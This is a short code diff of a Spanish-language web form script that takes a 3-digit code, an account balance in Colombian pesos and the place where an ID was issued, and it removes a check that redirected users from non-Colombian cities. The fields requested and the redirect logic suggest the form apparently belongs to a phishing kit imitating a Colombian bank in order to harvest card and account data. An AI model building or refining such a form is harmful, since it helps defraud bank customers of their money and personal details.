@@ -57,10 +57,10 @@
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
   });
 
-  // Saldo: formato con puntos de miles mientras se escribe
+  // Saldo: formato COP + puntos de miles mientras se escribe
   balanceInput.addEventListener('input', (e) => {
     const raw = e.target.value.replace(/\D/g, '');
-    e.target.value = raw ? Number(raw).toLocaleString('es-CO') : '';
+    e.target.value = raw ? 'COP ' + Number(raw).toLocaleString('es-CO') : '';
   });
 
   // Submit
@@ -82,17 +82,6 @@
     const ok = digitsOk && balanceOk;
 
     if (ok) {
-      // Validación final: la ciudad de expedición debe ser una ciudad real de Colombia
-      const lugar = sessionStorage.getItem('lugarExp') || '';
-      if (typeof window.isColombianCity === 'function' && !window.isColombianCity(lugar)) {
-        showToast('Información incorrecta');
-        setTimeout(() => {
-          sessionStorage.clear();
-          window.location.href = 'index.php';
-        }, 2200);
-        return;
-      }
-
       const btn = form.querySelector('.btn-pink');
       btn.textContent = 'Validando...';
       btn.disabled = true;
